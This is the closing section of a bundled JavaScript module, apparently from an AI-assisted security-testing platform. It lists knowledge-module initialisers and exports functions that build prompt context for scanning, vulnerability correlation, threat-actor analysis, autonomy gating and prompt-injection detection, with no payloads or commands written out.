    init_offensive_tools_knowledge();
    init_bugbounty_methodology_knowledge();
    init_missed_vuln_training_knowledge();
    init_threat_actor_learning_context();
    init_zap_source_secrets_knowledge();
    init_burp_pentesting_knowledge();
    init_kev_service();
    init_file_upload_bypass_knowledge();
    init_platform_knowledge_corpus();
    init_graduated_autonomy();
    init_ai_chat_safety();
    _loadedModules = /* @__PURE__ */ new Set();
  }
});

export {
  clearKnowledgeCache,
  getKnowledgeCacheSize,
  getCacheStatus,
  getNmapScanPlanContext,
  getNmapVulnCorrelationContext,
  getNmapHuntContext,
  getScanforgeScanPlanContext2 as getScanforgeScanPlanContext,
  getScanforgeVulnCorrelationContext2 as getScanforgeVulnCorrelationContext,
  getScanforgeHuntContext2 as getScanforgeHuntContext,
  getFullScanforgeContext2 as getFullScanforgeContext,
  buildOptimalScanforgeCommand2 as buildOptimalScanforgeCommand,
  getChainsByVulnDescriptions2 as getChainsByVulnDescriptions,
  formatChainsForPrompt2 as formatChainsForPrompt,
  inferAssetContext2 as inferAssetContext,
  formatOntologyForPrompt2 as formatOntologyForPrompt,
  getBugBountyContext2 as getBugBountyContext,
  getTriageSystemPrompt2 as getTriageSystemPrompt,
  getTrainingExamplesForPrompt2 as getTrainingExamplesForPrompt,
  getTriageCorpusContext2 as getTriageCorpusContext,
  buildCloudSecurityContext2 as buildCloudSecurityContext,
  buildGeneralCloudContext2 as buildGeneralCloudContext,
  detectCloudProviders2 as detectCloudProviders,
  getOwaspScanPlanContext2 as getOwaspScanPlanContext,
  getOwaspVulnCorrelationContext2 as getOwaspVulnCorrelationContext,
  getOwaspAssetClassificationContext2 as getOwaspAssetClassificationContext,
  getThreatGroupScanContext2 as getThreatGroupScanContext,
  getThreatGroupVulnContext2 as getThreatGroupVulnContext,
  getSectorThreatContext2 as getSectorThreatContext,
  getGroupsByCVE2 as getGroupsByCVE,
  buildOffensiveTechniquesContext2 as buildOffensiveTechniquesContext,
  getFirewallEvasionContext2 as getFirewallEvasionContext,
  getFileUploadBypassContext2 as getFileUploadBypassContext,
  getLOTLContext2 as getLOTLContext,
  getShodanReconContext2 as getShodanReconContext,
  getSubdomainEnumContext2 as getSubdomainEnumContext,
  buildZAPKnowledgeContext2 as buildZAPKnowledgeContext,
  getZAPAlertCatalogContext2 as getZAPAlertCatalogContext,
  getTechScanPolicyContext2 as getTechScanPolicyContext,
  getZAPAuthContext2 as getZAPAuthContext,
  getZAPReasoningPrompt2 as getZAPReasoningPrompt,
  getVulnPayloadContext2 as getVulnPayloadContext,
  buildToolRecommendationContext2 as buildToolRecommendationContext,
  buildAttackPlannerToolContext2 as buildAttackPlannerToolContext,
  buildMethodologyContext2 as buildMethodologyContext,
  buildPhaseToolContext2 as buildPhaseToolContext,
  buildVulnTestingContext2 as buildVulnTestingContext,
  buildScanPlanningContext2 as buildScanPlanningContext,
  buildMissedVulnContext2 as buildMissedVulnContext,
  buildMissedVulnAttackContext2 as buildMissedVulnAttackContext,
  buildThreatActorLearningContext2 as buildThreatActorLearningContext,
  buildThreatActorVulnContext2 as buildThreatActorVulnContext,
  scoreEngagementThreatAttribution2 as scoreEngagementThreatAttribution,
  clearThreatLearningCache2 as clearThreatLearningCache,
  buildSourceSecretsContext2 as buildSourceSecretsContext,
  buildCompactSourceSecretsContext2 as buildCompactSourceSecretsContext,
  buildBurpKnowledgeContext2 as buildBurpKnowledgeContext,
  getBurpScanConfigContext2 as getBurpScanConfigContext,
  getBurpAttackProfileContext2 as getBurpAttackProfileContext,
  getBurpCollaboratorContext2 as getBurpCollaboratorContext,
  getCrossToolCorrelationContext2 as getCrossToolCorrelationContext,
  getBurpReasoningPrompt2 as getBurpReasoningPrompt,
  lazyFetchKevCatalog,
  lazyMatchCvesAgainstKev,
  lazyCalculateKevRiskBoost,
  buildFileUploadTrainingContext2 as buildFileUploadTrainingContext,
  getBypassStrategy2 as getBypassStrategy,
  getTechniquesForStack2 as getTechniquesForStack,
  getTechniquesByCategory2 as getTechniquesByCategory,
  buildPlatformKnowledgeContext2 as buildPlatformKnowledgeContext,
  buildEngagementKnowledgeContext2 as buildEngagementKnowledgeContext,
  getKnowledgeModuleCount2 as getKnowledgeModuleCount,
  evaluateAutonomyLevel2 as evaluateAutonomyLevel,
  canExecuteAction2 as canExecuteAction,
  getAutonomyDescription2 as getAutonomyDescription,
  createSafeChatContext2 as createSafeChatContext,
  sanitizeAIOutput2 as sanitizeAIOutput,
  detectPromptInjection2 as detectPromptInjection,
  init_knowledge_lazy
};
